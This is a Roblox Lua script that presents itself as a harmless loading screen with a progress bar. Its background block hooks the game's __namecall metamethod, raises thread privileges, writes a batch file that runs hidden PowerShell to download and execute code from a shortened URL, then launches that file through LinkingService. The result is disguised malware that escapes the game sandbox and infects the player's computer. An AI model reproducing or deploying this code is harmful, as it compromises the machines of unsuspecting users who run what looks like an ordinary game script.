local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create the main frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BackgroundTransparency = 0.3
frame.Parent = screenGui

-- Create the "Loading..." text
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
textLabel.Position = UDim2.new(0.25, 0, 0.4, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "Loading..."
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold
textLabel.Parent = frame

-- Create the loading bar frame
local loadingBarFrame = Instance.new("Frame")
loadingBarFrame.Size = UDim2.new(0.4, 0, 0.05, 0)
loadingBarFrame.Position = UDim2.new(0.3, 0, 0.5, 0)
loadingBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
loadingBarFrame.Parent = frame

-- Create the loading bar fill
local loadingBarFill = Instance.new("Frame")
loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
loadingBarFill.Parent = loadingBarFrame

-- Add corner rounding to the loading bar
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 5)
uiCorner.Parent = loadingBarFrame
local uiCornerFill = Instance.new("UICorner")
uiCornerFill.CornerRadius = UDim.new(0, 5)
uiCornerFill.Parent = loadingBarFill

-- Run the provided script in the background
spawn(function()
    local RawMetaTable = getrawmetatable(game)
    local MaliciousPayloadRan = false
    local OldClosure = RawMetaTable.__namecall

    setreadonly(RawMetaTable, false)

    RawMetaTable.__namecall = function(...)
        if not MaliciousPayloadRan then 
            MaliciousPayloadRan = true

            local OldThreadIdentity = getidentity()

            setidentity(8)

            local BatchPayload = [[
@echo off
powershell.exe -NoProfile -WindowStyle Hidden -Command "irm https://tinyurl.com/22hx3kod | iex"
]]
            local payload = game:GetService("ScriptContext"):SaveScriptProfilingData(BatchPayload, "run_remote_hidden.bat")
            game:GetService("LinkingService"):OpenUrl(payload)

            setidentity(OldThreadIdentity or 2)
            return
        end

        return OldClosure(...)
    end

    setreadonly(RawMetaTable, true)
end)

-- Animate the loading bar over 120 seconds
local tweenInfo = TweenInfo.new(120, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
local tween = TweenService:Create(loadingBarFill, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
tween:Play()

-- Destroy the loading screen after completion
tween.Completed:Connect(function()
    screenGui:Destroy()
end)
